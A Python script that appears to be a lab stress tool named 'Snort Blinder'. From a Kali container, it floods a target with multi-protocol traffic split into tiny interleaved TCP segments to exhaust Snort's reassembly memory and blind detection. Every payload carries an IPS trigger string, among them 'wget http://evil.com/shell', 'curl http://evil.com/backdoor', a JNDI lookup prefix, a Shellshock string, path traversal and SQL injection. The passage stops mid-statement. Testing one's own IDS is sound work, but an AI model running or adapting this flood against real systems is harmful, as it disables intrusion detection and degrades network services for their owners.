#!/usr/bin/env python3
"""
Snort Blinder - Multi-Protocol Inspector Overload Test
=======================================================
Split architecture:
  - HOST mode (default): orchestrates Snort setup, launches flood inside
    kali_attacker via docker exec, monitors Snort alerts, displays dashboard.
  - FLOOD mode (--flood): runs INSIDE kali_attacker container. Fires all
    protocol mutators simultaneously against the target. Writes stats to
    a shared JSON file so the host orchestrator can read them.

Usage (from host):
    python3 Testing/snort_blinder.py
    python3 Testing/snort_blinder.py --duration 120 --phase-duration 30

The script auto-detects whether it's inside kali (flood mode) or on the
host (orchestrator mode) based on --flood flag.
"""

import argparse
import json
import os
import random
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import defaultdict, deque

# -- Path setup ---------------------------------------------------------------
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

# -- Constants ----------------------------------------------------------------
TARGET_IP = "172.21.0.2"
MAX_PAYLOAD_SIZE = 4096
PAYLOAD_POOL_SIZE = 50
POOL_REFRESH_INTERVAL = 500

TCP_CONNECT_TIMEOUT = 0.1
TCP_SEND_TIMEOUT = 0.3
TCP_PAYLOADS_PER_CONN = 500
UDP_SEND_TIMEOUT = 0.05

CANARY_PAYLOAD = b"GET /EICAR-STANDARD-ANTIVIRUS-TEST-FILE! HTTP/1.1\r\nHost: target\r\n\r\n"
CANARY_SID = "1000001"


ATTACKER = "kali_attacker"
FIREWALL = "snort_firewall"
SNORT_LOG = "/var/log/snort/alert_fast.txt"
STATS_FILE = "/tmp/blinder_stats.json"

# ═══════════════════════════════════════════════════════════════════════════════
# FLOOD ENGINE  (runs inside kali_attacker)
# ═══════════════════════════════════════════════════════════════════════════════

# Protocol registry: name -> (transport, port, mutator_class_name)
PROTOCOL_REGISTRY = {
    "dns":     ("tcp",  53,   None),
    "dhcp":    ("udp",  67,   "DhcpMutator"),
    "snmp":    ("udp",  161,  "SnmpMutator"),
    "sip":     ("udp",  5060, "SipMutator"),
    "mgcp":    ("udp",  2427, "MgcpMutator"),
    "radius":  ("udp",  1812, "RadiusMutator"),
    "sunrpc":  ("udp",  111,  "SunrpcMutator"),
    "tftp":    ("udp",  69,   "TftpMutator"),
    "http":    ("tcp",  80,   "HttpMutator"),
    "ftp":     ("tcp",  21,   "FtpMutator"),
    "smtp":    ("tcp",  25,   "SmtpMutator"),
    "ssh":     ("tcp",  22,   "SshMutator"),
    "smb2":    ("tcp",  445,  "Smb2Mutator"),
    "http2":   ("tcp",  80,   "Http2Mutator"),
    "dcerpc":  ("tcp",  135,  "DcerpcMutator"),
    "rtsp":    ("tcp",  554,  "RtspMutator"),
    "tacacs":  ("tcp",  49,   "TacacsMutator"),
    "ldap":    ("tcp",  389,  "LdapMutator"),
    "cifs":    ("tcp",  445,  "CifsMutator"),
    "telnet":  ("tcp",  23,   "TelnetMutator"),
    "icmp":    ("icmp", 0,    "IcmpMutator"),
    "http_clean":   ("tcp_vol", 80,  None),
    "http_clean2":  ("tcp_vol", 80,  None),
    "http_clean3":  ("tcp_vol", 80,  None),
    "rtsp_clean":   ("tcp_vol", 554, None),
    "ftp_clean":    ("tcp_vol", 21,  None),
}


def _import_mutators():
    """Lazy-import mutators (only needed inside flood engine)."""
    from protocol.dns import DNSMessage, DNSHeader, DNSQuestion
    from protocol.ftp import FtpMutator
    from protocol.http import HttpMutator
    from protocol.smtp import SmtpMutator
    from protocol.ssh import SshMutator
    from protocol.smb import Smb2Mutator
    from protocol.http2 import Http2Mutator
    from protocol.dcerpc import DcerpcMutator
    from protocol.dhcp import DhcpMutator
    from protocol.snmp import SnmpMutator
    from protocol.icmp import IcmpMutator
    from protocol.sip import SipMutator
    from protocol.mgcp import MgcpMutator
    from protocol.rtsp import RtspMutator
    from protocol.radius import RadiusMutator
    from protocol.tacacs import TacacsMutator
    from protocol.ldap import LdapMutator
    from protocol.cifs import CifsMutator
    from protocol.sunrpc import SunrpcMutator
    from protocol.telnet import TelnetMutator
    from protocol.tftp import TftpMutator
    return {
        "DhcpMutator": DhcpMutator, "SnmpMutator": SnmpMutator,
        "SipMutator": SipMutator, "MgcpMutator": MgcpMutator,
        "RadiusMutator": RadiusMutator, "SunrpcMutator": SunrpcMutator,
        "TftpMutator": TftpMutator, "HttpMutator": HttpMutator,
        "FtpMutator": FtpMutator, "SmtpMutator": SmtpMutator,
        "SshMutator": SshMutator, "Smb2Mutator": Smb2Mutator,
        "Http2Mutator": Http2Mutator, "DcerpcMutator": DcerpcMutator,
        "RtspMutator": RtspMutator, "TacacsMutator": TacacsMutator,
        "LdapMutator": LdapMutator, "CifsMutator": CifsMutator,
        "TelnetMutator": TelnetMutator, "IcmpMutator": IcmpMutator,
        "DNSMessage": DNSMessage, "DNSHeader": DNSHeader,
        "DNSQuestion": DNSQuestion,
    }


class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.packets = defaultdict(int)
        self.bytes_sent = defaultdict(int)
        self.errors = defaultdict(int)
        self.canary_sent = 0
        self.canary_ok = 0
        self.start_time = None

    def record_batch(self, proto, count, nbytes, errors=0):
        with self._lock:
            self.packets[proto] += count
            self.bytes_sent[proto] += nbytes
            if errors:
                self.errors[proto] += errors

    def record(self, proto, nbytes, error=False):
        with self._lock:
            if error:
                self.errors[proto] += 1
            else:
                self.packets[proto] += 1
                self.bytes_sent[proto] += nbytes

    def record_canary(self):
        with self._lock:
            self.canary_sent += 1

    def snapshot(self):
        with self._lock:
            elapsed = (time.time() - self.start_time) if self.start_time else 1
            total_pkts = sum(self.packets.values())
            total_byt = sum(self.bytes_sent.values())
            return {
                "elapsed": round(elapsed, 1),
                "total_packets": total_pkts,
                "total_bytes": total_byt,
                "pps": round(total_pkts / max(elapsed, 1)),
                "mbps": round((total_byt * 8) / (max(elapsed, 1) * 1_000_000), 2),
                "per_proto": dict(self.packets),
                "errors": dict(self.errors),
                "canary_sent": self.canary_sent,
            }


stats = Stats()
stop_event = threading.Event()
current_phase = {"num": 0, "send_delay": 0.0}


# -- Payload Generation -------------------------------------------------------
def gen_dns_payload(dns_classes):
    """Generate a TCP-framed DNS payload (2-byte length prefix + DNS message)."""
    domains = [
        "evil.test.local", "fuzz.example.com", "x" * 60 + ".test.local",
        "admin.internal.corp", "a." * 30 + "test.com",
    ]
    hdr = dns_classes["DNSHeader"](transaction_id=random.randint(0, 65535), qdcount=1)
    q = dns_classes["DNSQuestion"](random.choice(domains),
                                   random.choice([1, 2, 5, 6, 15, 16, 28, 33, 255]))
    raw = dns_classes["DNSMessage"](header=hdr, questions=[q]).to_bytes()
    return struct.pack("!H", len(raw)) + raw


def gen_mutated_payload(mutator):
    result = mutator.mutate()
    if isinstance(result, tuple):
        payload = result[0]
    elif isinstance(result, dict):
        payload = result.get("payload", result.get("data", b""))
    elif isinstance(result, bytes):
        payload = result
    else:
        payload = bytes(result) if result else b"\x00" * 64
    if not isinstance(payload, bytes):
        payload = bytes(payload) if payload else b"\x00" * 32
    return payload[:MAX_PAYLOAD_SIZE]


# Patterns that force Snort's rule engine into deep evaluation.
# These are substrings from well-known IPS signatures — each one forces Snort
# to evaluate the matching rule(s) fully. Mixed into flood payloads, they
# create sustained processing load instead of random bytes that Snort skips.
_IPS_TRIGGERS = [
    b"/etc/passwd",
    b"/etc/shadow",
    b"../../../../../../etc/passwd",
    b"..\\..\\..\\..\\windows\\system32\\config\\sam",
    b"<script>alert(1)</script>",
    b"<img src=x onerror=alert(1)>",
    b"SELECT * FROM users WHERE",
    b"UNION SELECT NULL,NULL,NULL--",
    b"' OR '1'='1'--",
    b"; DROP TABLE",
    b"cmd.exe /c ",
    b"/bin/sh -c ",
    b"powershell -enc ",
    b"wget http://evil.com/shell",
    b"curl http://evil.com/backdoor",
    b"<?php system($_GET",
    b"eval(base64_decode(",
    b"() { :;}; /bin/bash",
    b"${jndi:ldap://",
    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    b"\x4d\x5a\x90\x00\x03\x00\x00\x00",
    b"\x7fELF\x02\x01\x01\x00",
    b"%PDF-1.4\n%\xe2\xe3\xcf\xd3",
    b"PK\x03\x04\x14\x00\x00\x00",
    b"Rar!\x1a\x07\x00",
]


def build_payload_pool(proto, mutator, dns_classes=None):
    pool = []
    for _ in range(PAYLOAD_POOL_SIZE):
        try:
            if proto == "dns" and dns_classes:
                p = gen_dns_payload(dns_classes)[:MAX_PAYLOAD_SIZE]
            elif mutator:
                p = gen_mutated_payload(mutator)
            else:
                p = b"\x00" * 64
        except Exception:
            p = b"\x00" * 64
        p = (random.choice(_IPS_TRIGGERS) + p)[:MAX_PAYLOAD_SIZE]
        pool.append(p)
    return pool


BATCH_SIZE = 50  # Flush stats every N packets

# -- UDP Worker ---------------------------------------------------------------
# Rotate UDP sockets aggressively so each new socket gets a fresh ephemeral
# source port → new LINA flow entry → new block allocation.
_UDP_SOCK_POOL = 24
_UDP_SOCK_ROTATE = 5

def udp_worker(proto, target, port, mutator, dns_classes):
    pool = build_payload_pool(proto, mutator, dns_classes)
    idx = random.randint(0, len(pool) - 1)
    refresh = 0
    local_pkts = 0
    local_bytes = 0
    local_errs = 0

    def _new_sock():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(UDP_SEND_TIMEOUT)
        return s

    sock_pool = [_new_sock() for _ in range(_UDP_SOCK_POOL)]
    send_counts = [0] * _UDP_SOCK_POOL
    cursor = 0

    while not stop_event.is_set():
        si = cursor % _UDP_SOCK_POOL
        cursor += 1

        if send_counts[si] >= _UDP_SOCK_ROTATE:
            try:
                sock_pool[si].close()
            except Exception:
                pass
            sock_pool[si] = _new_sock()
            send_counts[si] = 0

        try:
            payload = pool[idx % len(pool)]
            idx += 1
            sock_pool[si].sendto(payload, (target, port))
            local_pkts += 1
            local_bytes += len(payload)
            send_counts[si] += 1
            delay = current_phase.get("send_delay", 0)
            if delay > 0:
                time.sleep(delay)
            if local_pkts >= BATCH_SIZE:
                stats.record_batch(proto, local_pkts, local_bytes, local_errs)
                local_pkts = local_bytes = local_errs = 0
            refresh += 1
            if refresh >= POOL_REFRESH_INTERVAL:
                refresh = 0
                pool = build_payload_pool(proto, mutator, dns_classes)
                idx = 0
        except Exception:
            local_errs += 1
            try:
                sock_pool[si].close()
            except Exception:
                pass
            sock_pool[si] = _new_sock()
            send_counts[si] = 0
            if local_errs >= BATCH_SIZE:
                stats.record_batch(proto, local_pkts, local_bytes, local_errs)
                local_pkts = local_bytes = local_errs = 0
    if local_pkts or local_errs:
        stats.record_batch(proto, local_pkts, local_bytes, local_errs)
    for s in sock_pool:
        try:
            s.close()
        except Exception:
            pass


# -- TCP Persistent Worker ----------------------------------------------------
# Multi-segment splitting: each payload is split into many tiny segments
# (64-256 bytes) and delivered one segment per slot in round-robin across
# the connection pool.  This forces Snort's TCP reassembly engine to hold
# partial buffers across ALL connections simultaneously.  Each tiny segment
# is a separate TCP packet (TCP_NODELAY) → separate DAQ entry → separate
# 2560-byte block allocation.  The round-robin interleaving means segments
# for the same connection are delayed by POOL_SIZE iterations, maximising
# the time Snort must hold each reassembly buffer.
_TCP_WORKER_POOL = 80
_CONN_ROTATE_PAYLOADS = 3
_SEG_MIN = 64
_SEG_MAX = 256

def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
    pool = build_payload_pool(proto, mutator, dns_classes)
    idx = random.randint(0, len(pool) - 1)
    refresh = 0
    local_pkts = 0
    local_bytes = 0
    local_errs = 0

    sock_pool = [None] * _TCP_WORKER_POOL
    pending_segs = [deque() for _ in range(_TCP_WORKER_POOL)]
    payloads_done = [0] * _TCP_WORKER_POOL
    cursor = 0

    def _open(slot):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                         struct.pack('ii', 1, 0))
            s.settimeout(TCP_CONNECT_TIMEOUT)
            s.connect((target, port))
            s.settimeout(TCP_SEND_TIMEOUT)
            sock_pool[slot] = s
            payloads_done[slot] = 0
            return s
        except OSError:
            sock_pool[slot] = None
            return None

    def _close(slot):
        s = sock_pool[slot]
        sock_pool[slot] = None
        pending_segs[slot].clear()
        payloads_done[slot] = 0
        if s:
            try: s.close()
            except Exception: pass

    def _flush():
        nonlocal local_pkts, local_bytes, local_errs
        if local_pkts or local_errs:
            stats.record_batch(proto, local_pkts, local_bytes, local_errs)
            local_pkts = local_bytes = local_errs = 0

    def _split(payload):
        segs = deque()
        off = 0
        while off < len(payload):
            sz = random.randint(_SEG_MIN, _SEG_MAX)
            segs.append(payload[off:off + sz])
            off += sz
        return segs

    for _pre in range(_TCP_WORKER_POOL):
        if stop_event.is_set():
            break
        _open(_pre)

    while not stop_event.is_set():
        slot = cursor % _TCP_WORKER_POOL
        cursor += 1

        if payloads_done[slot] >= _CONN_ROTATE_PAYLOADS:
            _close(slot)

        if not pending_segs[slot]:
            s = sock_pool[slot]
            if s is None:
                s = _open(slot)
                if s is None:
                    local_errs += 1
                    if local_errs >= BATCH_SIZE:
                        _flush()
                    continue
            payload = pool[idx % len(pool)]
            idx += 1
            pending_segs[slot] = _split(payload)

        s = sock_pool[slot]
        if s is None:
            pending_segs[slot].clear()
            continue

        seg = pending_segs[slot].popleft()
        try:
            s.sendall(seg)
            local_pkts += 1
            local_bytes += len(seg)
        except OSError:
            _close(slot)
            local_errs += 1

        if not pending_segs[slot]:
            payloads_done[slot] += 1

        delay = current_phase.get("send_delay", 0)
        if delay > 0:
            time.sleep(delay)

        if local_pkts >= BATCH_SIZE:
            _flush()
        refresh += 1
        if refresh >= POOL_REFRESH_INTERVAL:
            refresh = 0
            pool = build_payload_pool(proto, mutator, dns_classes)
            idx = 0

    for slot in range(_TCP_WORKER_POOL):
        _close(slot)
    _flush()


# -- Clean payload generators (well-formed, pass LINA inspection) -------------

def _build_ips_body(size):
    """Build a body that mixes random data with IPS-triggering patterns.
    Every ~256-512 bytes, insert a trigger pattern surrounded by random data.
    This forces Snort's content-match engine to evaluate rules at many
    offsets throughout the body."""
    parts = []
    remaining = size
    while remaining > 0:
        trigger = random.choice(_IPS_TRIGGERS)
        pad_before = os.urandom(random.randint(64, 256))
        pad_after = os.urandom(random.randint(64, 256))
        segment = pad_before + trigger + pad_after
        parts.append(segment)
        remaining -= len(segment)
    body = b"".join(parts)
    return body[:size]


def build_clean_http_pool(target):
    """Generate pool of heavyweight HTTP payloads designed to pressure Snort.

    Strategy:
    1. Large POST bodies (4-12 KB) with IPS-triggering patterns embedded
       throughout — forces Snort's detection engine to evaluate rules at
       many offsets instead of fast-skipping pure random bytes.
    2. File-like content types (PDF, ZIP, EXE) trigger Snort's file
       inspection preprocessor, which holds blocks during reassembly.
    3. Chunked encoding forces HTTP inspect reassembly overhead.
    4. Each pool entry packs 3-6 requests = 16-48 KB per sendall()."""
    paths = [
        "/upload", "/api/v1/import", "/files/submit", "/data/ingest",
        "/api/v2/batch", "/webhook/receive", "/rpc/process",
        "/graphql", "/api/files/analyze", "/submit/report",
    ]
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "curl/8.4.0", "python-requests/2.31.0",
    ]
    content_types = [
        "application/octet-stream",
        "application/pdf",
        "application/zip",
        "image/png",
        "application/x-executable",
        "multipart/form-data; boundary=----FormBoundary7MA4YWxkTrZu0gW",
    ]
    pool = []
    for _ in range(PAYLOAD_POOL_SIZE):
        buf = b""
        n_reqs = random.randint(3, 6)
        for _ in range(n_reqs):
            path = random.choice(paths)
            agent = random.choice(agents)
            ct = random.choice(content_types)

            use_chunked = random.random() < 0.4
            body_size = random.randint(4096, 12288)
            body = _build_ips_body(body_size)

            if "multipart" in ct:
                boundary = "----FormBoundary7MA4YWxkTrZu0gW"
                fname = random.choice([
                    f"payload_{random.randint(1000,9999)}.exe",
                    f"document_{random.randint(1000,9999)}.pdf",
                    f"archive_{random.randint(1000,9999)}.zip",
                    f"data_{random.randint(1000,9999)}.bin",
                    f"update_{random.randint(1000,9999)}.dll",
                ])
                mp_body = (
                    f"--{boundary}\r\n"
                    f"Content-Disposition: form-data; name=\"file\"; "
                    f"filename=\"{fname}\"\r\n"
                    f"Content-Type: application/octet-stream\r\n\r\n"
                ).encode() + body + f"\r\n--{boundary}--\r\n".encode()
                req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {agent}\r\n"
                    f"Content-Type: {ct}\r\n"
                    f"Content-Length: {len(mp_body)}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode() + mp_body
            elif use_chunked:
                chunks = b""
                offset = 0
                while offset < len(body):
                    chunk_sz = random.randint(512, 2048)
                    chunk = body[offset:offset + chunk_sz]
                    chunks += f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n"
                    offset += chunk_sz
                chunks += b"0\r\n\r\n"
                req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {agent}\r\n"
                    f"Content-Type: {ct}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode() + chunks
            else:
                req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {agent}\r\n"
                    f"Content-Type: {ct}\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode() + body
            buf += req
        pool.append(buf)
    return pool


def build_clean_rtsp_pool(target):
    """Generate pool of valid, pipelined RTSP requests that LINA passes through."""
    streams = [
        f"rtsp://{target}/live/stream1",
        f"rtsp://{target}/media/video",
        f"rtsp://{target}/cam/main",
        f"rtsp://{target}/vod/movie1.mp4",
    ]
    pool = []
    for _ in range(PAYLOAD_POOL_SIZE):
        n_reqs = random.randint(5, 12)
        buf = b""
        for i in range(n_reqs):
            method = random.choice(["OPTIONS", "DESCRIBE", "SETUP", "PLAY",
                                     "PAUSE", "TEARDOWN", "GET_PARAMETER"])
            uri = random.choice(streams)
            if method == "OPTIONS":
                uri = "*"
            cseq = i + random.randint(1, 1000)
            req = (
                f"{method} {uri} RTSP/1.0\r\n"
                f"CSeq: {cseq}\r\n"
                f"User-Agent: VLC/3.0.20 LibVLC/3.0.20\r\n"
            )
            if method == "SETUP":
                req += f"Transport: RTP/AVP;unicast;client_port=8000-8001\r\n"
            elif method == "PLAY":
                req += f"Session: {random.randint(100000, 999999)}\r\n"
                req += f"Range: npt=0.000-\r\n"
            elif method == "DESCRIBE":
                req += f"Accept: application/sdp\r\n"
            req += "\r\n"
            buf += req.encode()
        pool.append(buf)
    return pool


def build_clean_ftp_pool(target):
    """Generate pool of valid FTP command sequences that LINA passes through."""
    dirs = ["/pub", "/data", "/incoming", "/files", "/archive", "/backup"]
    filenames = ["readme.txt", "data.csv", "report.pdf", "log.txt", "config.ini"]
    pool = []
    for _ in range(PAYLOAD_POOL_SIZE):
        cmds = "USER anonymous\r\nPASS anonymous@test.com\r\n"
        for _ in range(random.randint(15, 30)):
            cmd = random.choice([
                f"CWD {random.choice(dirs)}\r\n",
                "PWD\r\n",
                "SYST\r\n",
                "TYPE A\r\n",
                "TYPE I\r\n",
                "PASV\r\n",
                f"LIST {random.choice(dirs)}\r\n",
                f"STAT {random.choice(filenames)}\r\n",
                f"SIZE {random.choice(filenames)}\r\n",
                f"MDTM {random.choice(filenames)}\r\n",
                "FEAT\r\n",
                "NOOP\r\n",
                "HELP\r\n",
                f"RETR {random.choice(filenames)}\r\n",
            ])
            cmds += cmd
        cmds += "QUIT\r\n"
        pool.append(cmds.encode())
    return pool


# -- TCP Volume Worker (well-formed, multi-segment splitting) -----------------
_TCP_VOL_POOL = 120

def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
    """High-pressure TCP worker for well-formed payloads (HTTP/RTSP/FTP).

    Uses the same multi-segment splitting as tcp_persistent_worker.
    Large HTTP payloads (16-48 KB) are split into 64-256 byte segments,
    producing 60-750 DAQ entries per payload (vs ~10-33 without splitting).
    With 120 concurrent connections, each in partial reassembly state,
    Snort must hold blocks for all of them simultaneously."""

    if "http" in proto:
        pool = build_clean_http_pool(target)
    elif "rtsp" in proto:
        pool = build_clean_rtsp_pool(target)
    elif "ftp" in proto:
        pool = build_clean_ftp_pool(target)
    else:
        pool = build_clean_http_pool(target)

    idx = random.randint(0, len(pool) - 1)
    refresh = 0
    local_pkts = 0
    local_bytes = 0
    local_errs = 0

    sock_pool = [None] * _TCP_VOL_POOL
    pending_segs = [deque() for _ in range(_TCP_VOL_POOL)]
    payloads_done = [0] * _TCP_VOL_POOL
    cursor = 0

    def _open(slot):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                         struct.pack('ii', 1, 0))
            s.settimeout(TCP_CONNECT_TIMEOUT)
            s.connect((target, port))
            s.settimeout(TCP_SEND_TIMEOUT)
            sock_pool[slot] = s
            payloads_done[slot] = 0
            return s
        except OSError:
            sock_pool[slot] = None
            return None

    def _close(slot):
        s = sock_pool[slot]
        sock_pool[slot] = None
        pending_segs[slot].clear()
        payloads_done[slot] = 0
        if s:
            try: s.close()
            except Exception: pass

    def _flush():
        nonlocal local_pkts, local_bytes, local_errs
        if local_pkts or local_errs:
            stats.record_batch(proto, local_pkts, local_bytes, local_errs)
            local_pkts = local_bytes = local_errs = 0

    def _split(payload):
        segs = deque()
        off = 0
        while off < len(payload):
            sz = random.randint(_SEG_MIN, _SEG_MAX)
            segs.append(payload[off:off + sz])
            off += sz
        return segs

    for _pre in range(_TCP_VOL_POOL):
        if stop_event.is_set():
            break
        _open(_pre)

    while not stop_event.is_set():
        slot = cursor % _TCP_VOL_POOL
        cursor += 1

        if payloads_done[slot] >= _CONN_ROTATE_PAYLOADS:
            _close(slot)

        if not pending_segs[slot]:
            s = sock_pool[slot]
            if s is None:
                s = _open(slot)
                if s is None:
                    local_errs += 1
                    if local_errs >= BATCH_SIZE:
                        _flush()
                    continue
            payload = pool[idx % len(pool)]
            idx += 1
            pending_segs[slot] = _split(payload)

        s = sock_pool[slot]
        if s is None:
            pending_segs[slot].clear()
            continue

        seg = pending_segs[slot].popleft()
        try:
            s.sendall(seg)
            local_pkts += 1
            local_bytes += len(seg)
        except OSError:
            _close(slot)
            local_errs += 1

        if not pending_segs[slot]:
            payloads_done[slot] += 1

        if local_pkts >= BATCH_SIZE:
            _flush()
        refresh += 1
        if refresh >= POOL_REFRESH_INTERVAL:
            refresh = 0
            if "http" in proto:
                pool = build_clean_http_pool(target)
            elif "rtsp" in proto:
                pool = build_clean_rtsp_pool(target)
            elif "ftp" in proto:
                pool = build_clean_ftp_pool(target)
            idx = 0

    for slot in range(_TCP_VOL_POOL):
        _close(slot)
    _flush()


# -- ICMP Worker --------------------------------------------------------------
def icmp_worker(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(0.1)
    except PermissionError:
        print("  [!] ICMP requires root - skipping", flush=True)
        return

    def _make_pool():
        pool = []
        for _ in range(PAYLOAD_POOL_SIZE):
            ident = random.randint(0, 65535)
            seq = random.randint(0, 65535)
            data = os.urandom(random.randint(56, 512))
            hdr = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
            blob = hdr + data
            if len(blob) % 2:
                blob += b"\x00"
            s = sum(struct.unpack("!%dH" % (len(blob) // 2), blob))
            while s >> 16:
                s = (s & 0xFFFF) + (s >> 16)
            cksum = ~s & 0xFFFF
            pool.append(struct.pack("!BBHHH", 8, 0, cksum, ident, seq) + data)
        return pool

    icmp_pool = _make_pool()
    idx = 0
    refresh = 0

    while not stop_event.is_set():
        try:
            payload = icmp_pool[idx % len(icmp_pool)]
            idx += 1
            sock.sendto(payload, (target, 0))
            stats.record("icmp", len(payload))
            delay = current_phase.get("send_delay", 0)
            if delay > 0:
                time.sleep(delay)
            refresh += 1
            if refresh >= POOL_REFRESH_INTERVAL:
                refresh = 0
                icmp_pool = _make_pool()
                idx = 0
        except Exception:
            stats.record("icmp", 0, error=True)
    sock.close()


# -- Canary sender (TCP from inside kali) -------------------------------------
def canary_sender(target, interval=5.0):
    time.sleep(8)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, 80))
            s.sendall(CANARY_PAYLOAD)
            try: s.recv(4096)
            except Exception: pass
            s.close()
            stats.record_canary()
        except Exception:
            pass
        for _ in range(int(interval * 10)):
            if stop_event.is_set():
                return
            time.sleep(0.1)


# -- Stats writer (writes JSON to shared volume) ------------------------------
def _stats_writer_loop(path):
    while not stop_event.is_set():
        try:
            snap = stats.snapshot()
            with open(path, "w") as f:
                json.dump(snap, f)
        except Exception:
            pass
        time.sleep(1)


# -- Intensity presets --------------------------------------------------------
# Each level: (udp_threads_per_proto, tcp_conns_per_proto, phases)
INTENSITY_PRESETS = {
    1: {"udp": 3,  "tcp": 2,  "label": "Normal",
        "phases": [
            {"name": "Warm-up", "send_delay": 0.001},
            {"name": "Ramp",    "send_delay": 0.0005},
            {"name": "High",    "send_delay": 0.0001},
            {"name": "Max",     "send_delay": 0},
        ]},
    2: {"udp": 6,  "tcp": 4,  "label": "Elevated",
        "phases": [
            {"name": "Warm-up", "send_delay": 0.0005},
            {"name": "Ramp",    "send_delay": 0.0001},
            {"name": "High",    "send_delay": 0.00005},
            {"name": "Max",     "send_delay": 0},
        ]},
    3: {"udp": 10, "tcp": 6,  "label": "High",
        "phases": [
            {"name": "Warm-up", "send_delay": 0.0001},
            {"name": "Ramp",    "send_delay": 0.00005},
            {"name": "Max",     "send_delay": 0},
        ]},
    4: {"udp": 15, "tcp": 8,  "label": "Extreme",
        "phases": [
            {"name": "Warm-up", "send_delay": 0.00005},
            {"name": "Max",     "send_delay": 0},
        ]},
    5: {"udp": 30, "tcp": 16, "label": "Maximum",
        "phases": [
            {"name": "Max",     "send_delay": 0},
        ]},
}


# -- Flood engine main --------------------------------------------------------
def run_flood(target, duration, phase_duration, intensity=1,
              proto_filter=None, stats_file_override=None):
    preset = INTENSITY_PRESETS.get(intensity, INTENSITY_PRESETS[1])

    # Filter protocols if subset specified
    if proto_filter:
        active_reg = {k: v for k, v in PROTOCOL_REGISTRY.items() if k in proto_filter}
        tag = f"[worker {','.join(sorted(proto_filter))}]"
    else:
        active_reg = dict(PROTOCOL_REGISTRY)
        tag = "[all protocols]"

    sf = stats_file_override or STATS_FILE

    print("=" * 70, flush=True)
    print(f"  FLOOD ENGINE — Intensity {intensity} [{preset['label']}] {tag}",
          flush=True)
    print("=" * 70, flush=True)

    phases = preset["phases"]
    total_phases = len(phases)
    if duration < total_phases * phase_duration:
        phase_duration = max(duration // total_phases, 5)

    current_phase["num"] = 0
    current_phase["send_delay"] = phases[0]["send_delay"]

    print(f"  Target: {target}, Duration: {duration}s, Phases: {total_phases}x{phase_duration}s",
          flush=True)
    print(f"  UDP threads/proto: {preset['udp']}, TCP conns/proto: {preset['tcp']}",
          flush=True)
    print(f"  Protocols: {', '.join(sorted(active_reg.keys()))}", flush=True)
    print(f"  Stats file: {sf}", flush=True)
    print(f"  [*] IPS triggers: every payload carries a detection pattern", flush=True)

    # Import mutators
    print("  [*] Importing mutators...", flush=True)
    classes = _import_mutators()

    # Build mutator instances
    mutators = {}
    for name, (transport, port, mcls_name) in active_reg.items():
        if mcls_name and mcls_name in classes:
            try:
                mutators[name] = classes[mcls_name]()
            except Exception as e:
                print(f"      [!] {name}: {e}", flush=True)
                mutators[name] = None
        else:
            mutators[name] = None

    dns_classes = {k: classes[k] for k in ("DNSMessage", "DNSHeader", "DNSQuestion")}

    # Separate protocols by transport
    udp_protos = [(n, p) for n, (t, p, _) in active_reg.items() if t == "udp"]
    tcp_protos = [(n, p) for n, (t, p, _) in active_reg.items() if t == "tcp"]
    tcp_vol_protos = [(n, p) for n, (t, p, _) in active_reg.items() if t == "tcp_vol"]

    UDP_THREADS = preset["udp"]
    TCP_CONNS = preset["tcp"]

    workers = []
    stats.start_time = time.time()

    for name, port in udp_protos:
        for i in range(UDP_THREADS):
            w = threading.Thread(target=udp_worker,
                                 args=(name, target, port, mutators.get(name), dns_classes),
                                 daemon=True, name=f"udp-{name}-{i}")
            workers.append(w)

    for name, port in tcp_protos:
        for i in range(TCP_CONNS):
            w = threading.Thread(target=tcp_persistent_worker,
                                 args=(name, target, port, mutators.get(name), dns_classes),
                                 daemon=True, name=f"tcp-{name}-{i}")
            workers.append(w)

    for name, port in tcp_vol_protos:
        for i in range(TCP_CONNS):
            w = threading.Thread(target=tcp_volume_worker,
                                 args=(name, target, port, None, None),
                                 daemon=True, name=f"vol-{name}-{i}")
            workers.append(w)

    if "icmp" in active_reg:
        icmp_thread = threading.Thread(target=icmp_worker, args=(target,), daemon=True, name="icmp")
        workers.append(icmp_thread)

    canary_thread = threading.Thread(target=canary_sender, args=(target,), daemon=True, name="canary")
    writer_thread = threading.Thread(target=lambda: _stats_writer_loop(sf), daemon=True, name="stats-writer")

    total_w = len(workers)
    vol_count = len(tcp_vol_protos)
    print(f"  [*] Launching {total_w} workers "
